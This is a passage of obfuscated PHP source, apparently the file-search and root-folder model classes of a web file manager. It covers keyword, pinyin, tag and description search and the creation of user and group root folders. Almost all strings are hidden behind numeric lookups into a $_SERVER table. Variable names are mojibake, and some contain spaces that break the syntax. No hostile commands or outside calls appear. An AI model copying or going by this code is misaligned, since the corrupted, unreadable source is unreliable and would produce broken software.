self::AUTH_SHOW; $©Èş“®Ï = array_sum(array_unique($±ù¦‡Î€)); } public function sort($±ÖÚ˜ßÈ, $çÃÓ‚³Ê) { return parent::update($±ÖÚ˜ßÈ, $çÃÓ‚³Ê); } } goto DÀ´Åãº½Ø; FÛ„Ÿ½­»ê: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($Æ£Ò×Íü) { $”øãŸ¥  =& $_SERVER[”ôÑ§ì¸]; $œƒèˆ  = KodIO::fileTypeList(); $¶öóô«Ø = $œƒèˆ [$Æ£Ò×Íü]; if (!$¶öóô«Ø) { return array(); } $×ò¥ÚÚ = $¶öóô«Ø[$”øãŸ¥ [174]]; $÷­®•†Ç = $”øãŸ¥ [7]; if (!$¶öóô«Ø[$”øãŸ¥ [174]]) { $ø³¬¶¦… = array_to_keyvalue($œƒèˆ , $”øãŸ¥ [12], $”øãŸ¥ [174]); $×ò¥ÚÚ = implode($”øãŸ¥ [50], $ø³¬¶¦…); $÷­®•†Ç = $”øãŸ¥ [2122]; } $è¤‡¹ = explode($”øãŸ¥ [50], trim($×ò¥ÚÚ, $”øãŸ¥ [50])); return array($÷­®•†Ç, $è¤‡¹); } public function listPathType($¡¦Ë­­æ) { $€Üæâºï =& $_SERVER[”ôÑ§ì¸]; $à´ı´É‹ = $this->fileTypeWhere($¡¦Ë­­æ); if (!$à´ı´É‹) { return array(); } $Æº”±ö¾ = USER_ID; $‹×¬Äà = Model($€Üæâºï[566])->getInfo($Æº”±ö¾); $Æä×è¿æ = array($€Üæâºï[615] => SourceModel::TYPE_USER, $€Üæâºï[552] => array($€Üæâºï[579], $€Üæâºï[562] . $‹×¬Äà[$€Üæâºï[87]][$€Üæâºï[180]] . $€Üæâºï[580]), $€Üæâºï[616] => $Æº”±ö¾, $€Üæâºï[613] => 0, $€Üæâºï[614] => $à´ı´É‹); return $this->listSource($Æä×è¿æ); } public function listSearch($Œ«†ŸïÒ, $´úˆÑñù = 300) { $‡óÑß =& $_SERVER[”ôÑ§ì¸]; if (isset($Œ«†ŸïÒ[$‡óÑß[1960]]) && $Œ«†ŸïÒ[$‡óÑß[1960]]) { $Œ«†ŸïÒ[$‡óÑß[1960]] = str_replace($‡óÑß[427], $‡óÑß[2123], trim($Œ«†ŸïÒ[$‡óÑß[1960]])); } $¾¡ç•Ã¼ = $this->_parseSearchWhere($Œ«†ŸïÒ); if (!isset($¾¡ç•Ã¼[$‡óÑß[472]])) { $¾¡ç•Ã¼[$‡óÑß[472]] = 0; } $€Àñíø‰ = $‡óÑß[2124]; $Š“Œ¯½Ù = $¾¡ç•Ã¼; $†È¹ãÓ€ = $€Àñíø‰; $this->_listSearchBindPinyin($Œ«†ŸïÒ, $¾¡ç•Ã¼, $€Àñíø‰); $this->alias($‡óÑß[486])->_makeOrder(); $¾¡ç•Ã¼ = $this->parseWhereLike($¾¡ç•Ã¼); $şˆ²ÂÜ = $this->distinct(!0)->field($€Àñíø‰)->where($¾¡ç•Ã¼)->selectPage($´úˆÑñù); if ($GLOBALS[$‡óÑß[6]][$‡óÑß[424]][$‡óÑß[425]] && Input::check($Œ«†ŸïÒ[$‡óÑß[1960]], $‡óÑß[622]) && $şˆ²ÂÜ[$‡óÑß[409]][$‡óÑß[396]] == 1 && $şˆ²ÂÜ[$‡óÑß[409]][$‡óÑß[410]] == 0) { $şˆ²ÂÜ = $this->distinct(!0)->field($€Àñíø‰)->where($Š“Œ¯½Ù)->limit(1000)->select(); $şˆ²ÂÜ = array_page_split($şˆ²ÂÜ, !1, $´úˆÑñù); } $this->_listSearchFileContent($şˆ²ÂÜ, $Œ«†ŸïÒ, $†È¹ãÓ€, $Š“Œ¯½Ù); $this->_listSearchDesc($şˆ²ÂÜ, $Œ«†ŸïÒ, $†È¹ãÓ€); $this->_listSearchTag($şˆ²ÂÜ, $Œ«†ŸïÒ, $†È¹ãÓ€); $this->_listSearchGroupTag($şˆ²ÂÜ, $Œ«†ŸïÒ, $†È¹ãÓ€); $this->_listDataApply($şˆ²ÂÜ[$‡óÑß[412]]); $this->_listMake($şˆ²ÂÜ); return $şˆ²ÂÜ; } private function _listSearchFileContent(&$Å½Ã”, $¿Ì¶©ƒ‡, $Û°èû´, $­Óœ¶š³) { $ôÃàâÁæ =& $_SERVER[”ôÑ§ì¸]; if (!$¿Ì¶©ƒ‡[$ôÃàâÁæ[1960]] || $Å½Ã”[$ôÃàâÁæ[409]][$ôÃàâÁæ[396]] > 1) { return; } if (!isset($­Óœ¶š³[$ôÃàâÁæ[32]]) || !is_array($¿Ì¶©ƒ‡[$ôÃàâÁæ[508]])) { return; } $­Óœ¶š³[$ôÃàâÁæ[508]] = array($ôÃàâÁæ[7], $¿Ì¶©ƒ‡[$ôÃàâÁæ[508]]); unset($­Óœ¶š³[$ôÃàâÁæ[32]]); unset($¿Ì¶©ƒ‡[$ôÃàâÁæ[508]]); $ü«Ëä‡ó = $this->field($Û°èû´)->where($­Óœ¶š³)->limit($ôÃàâÁæ[2125])->select(); if (!$ü«Ëä‡ó || count($ü«Ëä‡ó) == 0) { return; } $Å½Ã”[$ôÃàâÁæ[412]] = array_merge($ü«Ëä‡ó, $Å½Ã”[$ôÃàâÁæ[412]]); $Å½Ã”[$ôÃàâÁæ[409]][$ôÃàâÁæ[410]] += count($ü«Ëä‡ó); } private function _listSearchTag(&$Ğ¬ôÑØç, $˜ìó˜», $Òßêã‘ö) { $§à®´ĞÊ =& $_SERVER[”ôÑ§ì¸]; if (!$˜ìó˜»[$§à®´ĞÊ[1960]] || $Ğ¬ôÑØç[$§à®´ĞÊ[409]][$§à®´ĞÊ[396]] > 1) { return; } $øˆ³ÍŞÌ = Model($§à®´ĞÊ[2126])->listData(); $”™™â£‚ = array(); $ÂàŸ–•… = $˜ìó˜»[$§à®´ĞÊ[1960]]; foreach ($øˆ³ÍŞÌ as $ßÄüŠ¬) { $Ñ²í‹Ìç = $ßÄüŠ¬[$§à®´ĞÊ[32]]; $ßğã¡¬÷ = str_replace($§à®´ĞÊ[53], $§à®´ĞÊ[12], Pinyin::get($Ñ²í‹Ìç)); if (stripos($Ñ²í‹Ìç, $ÂàŸ–•…) !== !1 || stripos($ßğã¡¬÷, $ÂàŸ–•…) !== !1) { $”™™â£‚[] = $ßÄüŠ¬[$§à®´ĞÊ[442]]; } } if (!$”™™â£‚) { return; } $Ô•”Äâà = array($§à®´ĞÊ[467] => array($§à®´ĞÊ[7], $”™™â£‚), $§à®´ĞÊ[1674] => USER_ID); $œÎõ¨Ö» = Model($§à®´ĞÊ[469])->field($§à®´ĞÊ[84])->where($Ô•”Äâà)->select(); $œÎõ¨Ö» = array_to_keyvalue($œÎõ¨Ö», $§à®´ĞÊ[12], $§à®´ĞÊ[84]); $”ÎÔê˜Ø = array_unique($œÎõ¨Ö»); $this->_listSearchMerge($Ğ¬ôÑØç, $˜ìó˜», $Òßêã‘ö, $”ÎÔê˜Ø); } private function _listSearchDesc(&$êÛÃÖŠ, $â…•å³, $¹½Ù‹½ê) { $°¤§Ó›¹ =& $_SERVER[”ôÑ§ì¸]; if (!$â…•å³[$°¤§Ó›¹[1960]] || $êÛÃÖŠ[$°¤§Ó›¹[409]][$°¤§Ó›¹[396]] > 1) { return; } $·æ±¬ıû = array($°¤§Ó›¹[94] => $°¤§Ó›¹[493], $°¤§Ó›¹[417] => array($°¤§Ó›¹[426], $°¤§Ó›¹[1962] . $â…•å³[$°¤§Ó›¹[1960]] . $°¤§Ó›¹[1962])); $µ¤©îöš = !1; if ($µ¤©îöš) { $ˆí¸ş¯ = $this->listSearchChildren($â…•å³[$°¤§Ó›¹[179]]); $ˆí¸ş¯ = array_unique($ˆí¸ş¯); if (!$ˆí¸ş¯) { return; } $·æ±¬ıû[$°¤§Ó›¹[180]] = array($°¤§Ó›¹[7], $ˆí¸ş¯); } $â›ñ„ = Model($°¤§Ó›¹[599])->field($°¤§Ó›¹[180])->where($·æ±¬ıû)->limit(5000)->select(); $–¸Äåèé = array_to_keyvalue($â›ñ„, $°¤§Ó›¹[12], $°¤§Ó›¹[180]); $this->_listSearchMerge($êÛÃÖŠ, $â…•å³, $¹½Ù‹½ê, $–¸Äåèé); } private function _listSearchGroupTag(&$÷ÙËç, $€¦Ëë»è, $€ïÀ”…‘) { $Â—„óú¤ =& $_SERVER[”ôÑ§ì¸]; if (!$€¦Ëë»è[$Â—„óú¤[1960]] || $÷ÙËç[$Â—„óú¤[409]][$Â—„óú¤[396]] > 1 || !$€¦Ëë»è[$Â—„óú¤[179]]) { return; } $…Öû¹©Ì = $this->sourceInfo($€¦Ëë»è[$Â—„óú¤[179]]); if (!$…Öû¹©Ì || $…Öû¹©Ì[$Â—„óú¤[177]] != SourceModel::TYPE_GROUP) { return; } $ûÁ¹ÁªÜ = $…Öû¹©Ì[$Â—„óú¤[537]]; $·¢®ÄÈ‘ = Model($Â—„óú¤[2127])->get($ûÁ¹ÁªÜ); $éÜ…—½’ = array(); $˜¼éÇúí = $€¦Ëë»è[$Â—„óú¤[1960]]; foreach ($·¢®ÄÈ‘[$Â—„óú¤[412]] as $õÇ¹­Õ¬) { $šºŠÛ¶ú = $õÇ¹­Õ¬[$Â—„óú¤[32]]; $òœÙÜŠœ = str_replace($Â—„óú¤[53], $Â—„óú¤[12], Pinyin::get($šºŠÛ¶ú)); if (stripos($šºŠÛ¶ú, $˜¼éÇúí) !== !1 || stripos($òœÙÜŠœ, $˜¼éÇúí) !== !1) { $éÜ…—½’[] = $õÇ¹­Õ¬[$Â—„óú¤[442]]; } } if (!$éÜ…—½’) { return; } $¤ˆìí = array($Â—„óú¤[467] => array($Â—„óú¤[7], $éÜ…—½’), $Â—„óú¤[1674] => 0, $Â—„óú¤[33] => $Â—„óú¤[1982] . $ûÁ¹ÁªÜ); $ŞŒ»Îï = Model($Â—„óú¤[469])->field($Â—„óú¤[84])->where($¤ˆìí)->select(); $ŞŒ»Îï = array_to_keyvalue($ŞŒ»Îï, $Â—„óú¤[12], $Â—„óú¤[84]); $§ÉúÀ’ = array_unique($ŞŒ»Îï); $this->_listSearchMerge($÷ÙËç, $€¦Ëë»è, $€ïÀ”…‘, $§ÉúÀ’); } private function _listSearchMerge(&$ÜûÇ£ôØ, $—®Â¢Çø, $éŒ‡®÷, $ïÊ­ü) { $“¶Åìªß =& $_SERVER[”ôÑ§ì¸]; if (!$ïÊ­ü) { return; } $ŸÛ‹ùıé = array_to_keyvalue($ÜûÇ£ôØ[$“¶Åìªß[412]], $“¶Åìªß[12], $“¶Åìªß[180]); $èÀÁ˜Ã = array_diff($ïÊ­ü, $ŸÛ‹ùıé); if (!$èÀÁ˜Ã) { return; } $÷´½Ú¤» = array($“¶Åìªß[180] => array($“¶Åìªß[7], $èÀÁ˜Ã)); $½‰•ÎÕâ = $this->field($éŒ‡®÷)->where($÷´½Ú¤»)->select(); if (!$½‰•ÎÕâ) { return; } $Úêêõ™™ = array(); foreach ($½‰•ÎÕâ as $Ù¯œºé˜) { if ($this->_listSearchFilter($Ù¯œºé˜, $—®Â¢Çø)) { $Úêêõ™™[] = $Ù¯œºé˜; } } $ÜûÇ£ôØ[$“¶Åìªß[412]] = array_merge($Úêêõ™™, $ÜûÇ£ôØ[$“¶Åìªß[412]]); $ÜûÇ£ôØ[$“¶Åìªß[409]][$“¶Åìªß[410]] += count($Úêêõ™™); } private function _listSearchFilter($©àâ³¤Õ, $ãóéÃÚ) { $à§ßƒ‰² =& $_SERVER[”ôÑ§ì¸]; $ì‹ñûæÃ = $©àâ³¤Õ[$à§ßƒ‰²[452]] == $à§ßƒ‰²[88]; if (!strstr($©àâ³¤Õ[$à§ßƒ‰²[552]], $à§ßƒ‰²[50] . $ãóéÃÚ[$à§ßƒ‰²[179]] . $à§ßƒ‰²[50])) { return !1; } if (isset($ãóéÃÚ[$à§ßƒ‰²[453]]) && $ãóéÃÚ[$à§ßƒ‰²[453]] != $à§ßƒ‰²[1921]) { if ($ãóéÃÚ[$à§ßƒ‰²[453]] == $à§ßƒ‰²[75] && !$ì‹ñûæÃ) { return !1; } if ($ãóéÃÚ[$à§ßƒ‰²[453]] != $à§ßƒ‰²[75] && $ì‹ñûæÃ) { return !1; } if (!strstr($©àâ³¤Õ[$à§ßƒ‰²[174]], $à§ßƒ‰²[50] . $ãóéÃÚ[$à§ßƒ‰²[453]] . $à§ßƒ‰²[50])) { return !1; } } if (isset($ãóéÃÚ[$à§ßƒ‰²[2128]]) && $ãóéÃÚ[$à§ßƒ‰²[2128]] < $©àâ³¤Õ[$à§ßƒ‰²[76]]) { return !1; } if (isset($ãóéÃÚ[$à§ßƒ‰²[2129]]) && $ãóéÃÚ[$à§ßƒ‰²[2129]] > $©àâ³¤Õ[$à§ßƒ‰²[76]]) { return !1; } if (isset($ãóéÃÚ[$à§ßƒ‰²[629]]) && $ãóéÃÚ[$à§ßƒ‰²[629]] != $©àâ³¤Õ[$à§ßƒ‰²[496]]) { return !1; } return !0; } public function listSearchChildren($ÂÊ¢õ»Ã, $…±³ = 5000) { $Ùıı’× =& $_SERVER[”ôÑ§ì¸]; $›Ç¥ŒÜª = array(); $ÜÃ‘ì¨í = $this->sourceInfo($ÂÊ¢õ»Ã); $¼¯éõŠ = array($Ùıı’×[552] => array($Ùıı’×[426], $ÜÃ‘ì¨í[$Ùıı’×[552]] . $ÜÃ‘ì¨í[$Ùıı’×[180]] . $Ùıı’×[580])); $ÁÆ¢˜ºí = $this->field($Ùıı’×[76])->where($¼¯éõŠ)->limit($…±³ + 1)->select(); $½Ìü•°ğ = is_array($ÁÆ¢˜ºí) ? count($ÁÆ¢˜ºí) : 0; if ($½Ìü•°ğ > $…±³) { return $this->_listSearchChildrenNear($ÂÊ¢õ»Ã, $…±³); } $¸œØ™ › = $this->field($Ùıı’×[180])->where($¼¯éõŠ)->select(); $›Ç¥ŒÜª = array_to_keyvalue($¸œØ™ ›, $Ùıı’×[12], $Ùıı’×[180]); return $›Ç¥ŒÜª; } private function _listSearchChildrenNear($Åñ‚ÆÍ, $ÅÇË¨Áì) { $Õ½Äà =& $_SERVER[”ôÑ§ì¸]; $ ìğŒ‘ü = array(); $­àİããü = array($Õ½Äà[179] => $Åñ‚ÆÍ); $ï˜“ÓÚ = $this->field($Õ½Äà[2130])->where($­àİããü)->select(); $”èÃ®ÍÄ = array_to_keyvalue(array_filter_by_field($ï˜“ÓÚ, $Õ½Äà[452], $Õ½Äà[88]), $Õ½Äà[12], $Õ½Äà[180]); $ ìğŒ‘ü = array_merge($ ìğŒ‘ü, array_to_keyvalue($ï˜“ÓÚ, $Õ½Äà[12], $Õ½Äà[180])); if (!$”èÃ®ÍÄ) { return $ ìğŒ‘ü; } $­àİããü = array($Õ½Äà[179] => array($Õ½Äà[7], $”èÃ®ÍÄ)); $ï˜“ÓÚ = $this->field($Õ½Äà[2130])->where($­àİããü)->limit($ÅÇË¨Áì)->select(); $ ìğŒ‘ü = array_merge($ ìğŒ‘ü, array_to_keyvalue($ï˜“ÓÚ, $Õ½Äà[12], $Õ½Äà[180])); $ ìğŒ‘ü = array_slice($ ìğŒ‘ü, 0, $ÅÇË¨Áì); return $ ìğŒ‘ü; } private function _listSearchBindPinyin($áçç×ä×, &$¼««Á¿ù, &$Ü¾µ×šû) { $êÂîÌ¤ =& $_SERVER[”ôÑ§ì¸]; if (!isset($áçç×ä×[$êÂîÌ¤[1960]]) || !$áçç×ä×[$êÂîÌ¤[1960]]) { return; } if (!Input::check($áçç×ä×[$êÂîÌ¤[1960]], $êÂîÌ¤[361]) || strlen($áçç×ä×[$êÂîÌ¤[1960]]) < 2) { return; } $¨Ğ¯ÒŠ° = "\114\105\x46\124\40\112\x4f\x49\116\40{$this->tablePrefix}\x69\x6f\x5f\x73\x6f\x75\162\x63\145\x5f\155\x65\164\x61\x20\155\145\164\141\40\157\156\x20\163\157\165\162\x63\x65\x2e\x73\x6f\x75\x72\x63\145\x49\104\40\x3d\x20\x6d\x65\x74\x61\56\x73\x6f\165\162\143\x65\x49\104"; $Åß¶Õ = array(); $Ü¾µ×šû = str_replace(array($êÂîÌ¤[245], $êÂîÌ¤[53], $êÂîÌ¤[2131]), $êÂîÌ¤[12], $Ü¾µ×šû); $Ü¾µ×šû = $êÂîÌ¤[478] . str_replace($êÂîÌ¤[50], $êÂîÌ¤[479], $Ü¾µ×šû); $èæùú¿ = $¼««Á¿ù[$êÂîÌ¤[32]]; unset($¼««Á¿ù[$êÂîÌ¤[32]]); foreach ($¼««Á¿ù as $‰¾€÷Ø¾ => $Ï‡ÛÓ§­) { $Åß¶Õ[$êÂîÌ¤[478] . $‰¾€÷Ø¾] = $Ï‡ÛÓ§­; } foreach ($èæùú¿ as $í»á½ÜÑ) { $Åß¶Õ[] = array($êÂîÌ¤[483] => $í»á½ÜÑ, $êÂîÌ¤[1031] => $êÂîÌ¤[1964], array($êÂîÌ¤[2132] => $í»á½ÜÑ, $êÂîÌ¤[2133] => array($êÂîÌ¤[7], array($êÂîÌ¤[505], $êÂîÌ¤[504])))); } $this->join($¨Ğ¯ÒŠ°); $¼««Á¿ù = $Åß¶Õ; } private function _parseSearchWhere($”áûı§À) { $ó¡Í”ƒ =& $_SERVER[”ôÑ§ì¸]; $¿ğ‰ÎÕÚ = array(); if (isset($”áûı§À[$ó¡Í”ƒ[782]]) && $”áûı§À[$ó¡Í”ƒ[782]]) { $¿ğ‰ÎÕÚ[$ó¡Í”ƒ[85]] = array($ó¡Í”ƒ[2134], $”áûı§À[$ó¡Í”ƒ[782]]); } if (isset($”áûı§À[$ó¡Í”ƒ[783]]) && $”áûı§À[$ó¡Í”ƒ[783]]) { $ü˜Íªâ‚ = array($ó¡Í”ƒ[2135], $”áûı§À[$ó¡Í”ƒ[783]]); if ($¿ğ‰ÎÕÚ[$ó¡Í”ƒ[85]]) { $¿ğ‰ÎÕÚ[$ó¡Í”ƒ[85]] = array($¿ğ‰ÎÕÚ[$ó¡Í”ƒ[85]], $ü˜Íªâ‚, $ó¡Í”ƒ[2136]); } else { $¿ğ‰ÎÕÚ[$ó¡Í”ƒ[85]] = $ü˜Íªâ‚; } } if (isset($”áûı§À[$ó¡Í”ƒ[2128]]) && $”áûı§À[$ó¡Í”ƒ[2128]] > 0) { $¿ğ‰ÎÕÚ[$ó¡Í”ƒ[76]] = array($ó¡Í”ƒ[2134], $”áûı§À[$ó¡Í”ƒ[2128]]); } if (isset($”áûı§À[$ó¡Í”ƒ[2129]]) && $”áûı§À[$ó¡Í”ƒ[2129]]) { $ü˜Íªâ‚ = array($ó¡Í”ƒ[2135], $”áûı§À[$ó¡Í”ƒ[2129]]); if ($¿ğ‰ÎÕÚ[$ó¡Í”ƒ[76]]) { $¿ğ‰ÎÕÚ[$ó¡Í”ƒ[76]] = array($¿ğ‰ÎÕÚ[$ó¡Í”ƒ[76]], $ü˜Íªâ‚, $ó¡Í”ƒ[2136]); } else { $¿ğ‰ÎÕÚ[$ó¡Í”ƒ[76]] = $ü˜Íªâ‚; } } if (isset($”áûı§À[$ó¡Í”ƒ[629]]) && $”áûı§À[$ó¡Í”ƒ[629]]) { $¿ğ‰ÎÕÚ[] = array($ó¡Í”ƒ[496] => $”áûı§À[$ó¡Í”ƒ[629]], $ó¡Í”ƒ[494] => $”áûı§À[$ó¡Í”ƒ[629]], $ó¡Í”ƒ[1031] => $ó¡Í”ƒ[1964]); } if (isset($”áûı§À[$ó¡Í”ƒ[453]]) && $”áûı§À[$ó¡Í”ƒ[453]]) { $½ƒûå• = $”áûı§À[$ó¡Í”ƒ[453]]; if ($½ƒûå• == $ó¡Í”ƒ[75]) { $¿ğ‰ÎÕÚ[$ó¡Í”ƒ[452]] = 1; } else { if ($½ƒûå• == $ó¡Í”ƒ[2137]) { $¿ğ‰ÎÕÚ[$ó¡Í”ƒ[452]] = 0; } else { if ($½ƒûå•) { $½ƒûå• = is_array($½ƒûå•) ? $½ƒûå• : explode($ó¡Í”ƒ[50], $½ƒûå•); $¿ğ‰ÎÕÚ[$ó¡Í”ƒ[453]] = array($ó¡Í”ƒ[459], $½ƒûå•); $¿ğ‰ÎÕÚ[$ó¡Í”ƒ[452]] = 0; } } } } $this->_parseSearchParent($”áûı§À, $¿ğ‰ÎÕÚ); if (isset($”áûı§À[$ó¡Í”ƒ[1960]]) && trim($”áûı§À[$ó¡Í”ƒ[1960]])) { $¤Îğ§õ½ = trim($”áûı§À[$ó¡Í”ƒ[1960]]); $¹²˜šşÊ = explode($ó¡Í”ƒ[53], $¤Îğ§õ½); if (strlen($¤Îğ§õ½) > 2 && (substr($¤Îğ§õ½, 0, 1) == $ó¡Í”ƒ[118] && substr($¤Îğ§õ½, -1) == $ó¡Í”ƒ[118]) || substr($¤Îğ§õ½, 0, 1) == $ó¡Í”ƒ[58] && substr($¤Îğ§õ½, -1) == $ó¡Í”ƒ[58]) { $¤Îğ§õ½ = substr($¤Îğ§õ½, 1, -1); $¹²˜šşÊ = array($¤Îğ§õ½); } $¿ğ‰ÎÕÚ[$ó¡Í”ƒ[32]] = array(array($ó¡Í”ƒ[579], $ó¡Í”ƒ[1962] . $¤Îğ§õ½ . $ó¡Í”ƒ[1962])); if (count($¹²˜šşÊ) > 1) { $¿ğ‰ÎÕÚ[$ó¡Í”ƒ[32]] = array(); foreach ($¹²˜šşÊ as $é™ãÉª¿) { if (!trim($é™ãÉª¿)) { continue; } $¿ğ‰ÎÕÚ[$ó¡Í”ƒ[32]][] = array($ó¡Í”ƒ[579], $ó¡Í”ƒ[1962] . trim($é™ãÉª¿) . $ó¡Í”ƒ[1962]); } } } return $¿ğ‰ÎÕÚ; } private function _parseSearchParent($’Ã©Ò€, &$ÇÅ·¾¾é) { $ˆä‹Æ”Ö =& $_SERVER[”ôÑ§ì¸]; if (!isset($’Ã©Ò€[$ˆä‹Æ”Ö[179]]) || !$’Ã©Ò€[$ˆä‹Æ”Ö[179]]) { return; } $èĞŞù = $this->pathInfo($’Ã©Ò€[$ˆä‹Æ”Ö[179]]); $¦•ñ›¦ = $èĞŞù[$ˆä‹Æ”Ö[179]] . $ˆä‹Æ”Ö[12] === $ˆä‹Æ”Ö[211]; $‹¯û”åç = $èĞŞù[$ˆä‹Æ”Ö[177]] == $ˆä‹Æ”Ö[546]; if ($èĞŞù[$ˆä‹Æ”Ö[563]] == $ˆä‹Æ”Ö[564]) { $½»Û®ïÆ = $this->sourceInfo($’Ã©Ò€[$ˆä‹Æ”Ö[179]]); $èĞŞù[$ˆä‹Æ”Ö[552]] = $½»Û®ïÆ[$ˆä‹Æ”Ö[552]]; } $ÇÅ·¾¾é[$ˆä‹Æ”Ö[619]] = array($ˆä‹Æ”Ö[579], $èĞŞù[$ˆä‹Æ”Ö[552]] . $’Ã©Ò€[$ˆä‹Æ”Ö[179]] . $ˆä‹Æ”Ö[580]); $ç‚ŸÖ°† = isset($’Ã©Ò€[$ˆä‹Æ”Ö[1825]]) && in_array($ˆä‹Æ”Ö[546], $’Ã©Ò€[$ˆä‹Æ”Ö[1825]]); if (!$ç‚ŸÖ°† || !$‹¯û”åç || !$¦•ñ›¦ || !$èĞŞù[$ˆä‹Æ”Ö[454]]) { return; } if (!AuthModel::authCheckRoot($èĞŞù[$ˆä‹Æ”Ö[454]][$ˆä‹Æ”Ö[455]])) { return; } $—âÅßÖø = $èĞŞù[$ˆä‹Æ”Ö[537]] . $ˆä‹Æ”Ö[12]; if ($—âÅßÖø == $ˆä‹Æ”Ö[88]) { unset($ÇÅ·¾¾é[$ˆä‹Æ”Ö[619]]); $ÇÅ·¾¾é[$ˆä‹Æ”Ö[177]] = self::TYPE_GROUP; return; } $¤ü±ù’Æ = Model($ˆä‹Æ”Ö[553])->groupChildrenAll($—âÅßÖø); $’ÏÖº³Å = count($¤ü±ù’Æ); if ($’ÏÖº³Å <= 1) { return; } $î²´°àÛ = array($ˆä‹Æ”Ö[179] => 0, $ˆä‹Æ”Ö[177] => self::TYPE_GROUP, $ˆä‹Æ”Ö[537] => array($ˆä‹Æ”Ö[7], $¤ü±ù’Æ)); $ööâı¦ = $this->field($ˆä‹Æ”Ö[2138])->where($î²´°àÛ)->limit($’ÏÖº³Å)->select(); $ÇÅ·¾¾é[$ˆä‹Æ”Ö[619]] = array(); foreach ($ööâı¦ as $ŠšÊ˜—š) { $ÇÅ·¾¾é[$ˆä‹Æ”Ö[619]][] = array($ˆä‹Æ”Ö[579], $ˆä‹Æ”Ö[562] . $ŠšÊ˜—š[$ˆä‹Æ”Ö[180]] . $ˆä‹Æ”Ö[580]); } $ÇÅ·¾¾é[$ˆä‹Æ”Ö[619]][] = $ˆä‹Æ”Ö[1964]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($Ì•ë”‘Å) { $—° ñğá =& $_SERVER[”ôÑ§ì¸]; $îÀ£¦èî = Model($—° ñğá[545])->where(array($—° ñğá[1665] => $Ì•ë”‘Å))->find(); $Ò²®´Šµ = $this->_mkdirRoot(SourceModel::TYPE_USER, $Ì•ë”‘Å, $îÀ£¦èî[$—° ñğá[32]]); $this->userDesktopAdd($Ò²®´Šµ); return $Ò²®´Šµ; } public function userDesktopAdd($à¤ÔŸ°ç) { $—ŒÈ¯øŸ =& $_SERVER[”ôÑ§ì¸]; $üÔ›‰ü¬ = LNG($—ŒÈ¯øŸ[2139]); $şòÛÚÈì = $this->mkdir($à¤ÔŸ°ç, $üÔ›‰ü¬); $this->metaSet($şòÛÚÈì, $—ŒÈ¯øŸ[2140], $—ŒÈ¯øŸ[88]); $this->metaSet($à¤ÔŸ°ç, $—ŒÈ¯øŸ[2141], $şòÛÚÈì); } public function userPathSafeAdd($íêÊçÙ³) { $ù²èöèİ =& $_SERVER[”ôÑ§ì¸]; $œ¨åÈ²û = Model($ù²èöèİ[545])->getInfoFull($íêÊçÙ³); if (!$œ¨åÈ²û) { return !1; } if (_get($œ¨åÈ²û, $ù²èöèİ[567])) { return $œ¨åÈ²û[$ù²èöèİ[506]][$ù²èöèİ[2142]]; } $’ğï = $this->_mkdirRoot(SourceModel::TYPE_USER, $íêÊçÙ³, $ù²èöèİ[2143], $ù²èöèİ[473]); Model($ù²èöèİ[545])->metaSet($íêÊçÙ³, $ù²èöèİ[2142], $’ğï); $this->metaSet($’ğï, $ù²èöèİ[2144], $íêÊçÙ³); return $’ğï; } public function groupRootAdd($ÙÚ˜ŞÀŒ) { $•ßÀ—“Ÿ =& $_SERVER[”ôÑ§ì¸]; $„İ½øûÄ = Model($•ßÀ—“Ÿ[553])->where(array($•ßÀ—“Ÿ[1954] => $ÙÚ˜ŞÀŒ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $ÙÚ˜ŞÀŒ, $„İ½øûÄ[$•ßÀ—“Ÿ[32]]); } public function systemRootPathAdd($êä˜â³Ê) { if ($êä˜â³Ê != $_SERVER[”ôÑ§ì¸][573]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $êä˜â³Ê); } public function userRootRemove($ã¸òóÓÎ) { $ÖØ•ÅˆÆ = $this->targetSourceRoot(SourceModel::TYPE_USER, $ã¸òóÓÎ, !0); foreach ($ÖØ•ÅˆÆ as $Ğú£ÕœÉ) { if (!$Ğú£ÕœÉ) { continue; } $this->remove($Ğú£ÕœÉ[$_SERVER[”ôÑ§ì¸][180]], !1); } } public function groupRootRemove($Ãí—ğŒØ) { $¹ÌÆ¹µ‡ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $Ãí—ğŒØ); if (!$¹ÌÆ¹µ‡) { return; } $this->remove($¹ÌÆ¹µ‡[$_SERVER[”ôÑ§ì¸][180]], !1); } private function _mkdirRoot($ÍŠÂÇ, $âìı¹ê¦, $¨¸Æ™€À, $ïíÃù = '') { $Œ™Üı¾ =& $_SERVER[”ôÑ§ì¸]; $À†µúòñ = defined($Œ™Üı¾[2087]) ? USER_ID : 0; $¨–…òå = array($Œ™Üı¾[444] => 0, $Œ™Üı¾[615] => $ÍŠÂÇ, $Œ™Üı¾[616] => $âìı¹ê¦, $Œ™Üı¾[613] => 1, $Œ™Üı¾[617] => $À†µúòñ, $Œ™Üı¾[618] => $À†µúòñ, $Œ™Üı¾[614] => $ïíÃù, $Œ™Üı¾[619] => $Œ™Üı¾[562], $Œ™Üı¾[471] => 0, $Œ™Üı¾[584] => 0, $Œ™Üı¾[509] => 0, $Œ™Üı¾[620] => $Œ™Üı¾[12]); if ($§òÃ©²› = $this->where($¨–…òå)->find()) { return $§òÃ©²›[$Œ™Üı¾[180]]; } $ÌÃ»”Ú = "\115\157\x64\x65\x6c\123\x6f\165\162\x63\145\56\155\x6b\144\x69\x72\x52\x6f\x6f\x74\56{$ÍŠÂÇ}\56{$âìı¹ê¦}\56" . $¨¸Æ™€À; CacheLock::lock($ÌÃ»”Ú); $¨–…òå[$Œ™Üı¾[32]] = $¨¸Æ™€À; $¾¸È´„¾ = $this->add($¨–…òå); $·”Å†Ö = array($Œ™Üı¾[621] => short_id($¾¸È´„¾)); $this->where(array($Œ™Üı¾[458] => $¾¸È´„¾))->save($·”Å†Ö); CacheLock::unlock($ÌÃ»”Ú); return $¾¸È´„¾; } private function targetSourceRoot($¤Éåİ´ó, $ø–Î¶å, $çÏ•ÎÓ = false) { $ŠÉ”•Šë =& $_SERVER[”ôÑ§ì¸]; $úÊ£™æó = array($ŠÉ”•Šë[444] => 0, $ŠÉ”•Šë[615] => $¤Éåİ´ó, $ŠÉ”•Šë[616] => $ø–Î¶å); if ($çÏ•ÎÓ) { $”½Ş‹—Ü = $this->where($úÊ£™æó)->select(); return $”½Ş‹—Ü ? $”½Ş‹—Ü : array(); } $ñŒà¿àü = $this->where($úÊ£™æó)->find(); return $ñŒà¿àü ? $ñŒà¿àü : array(); } public function 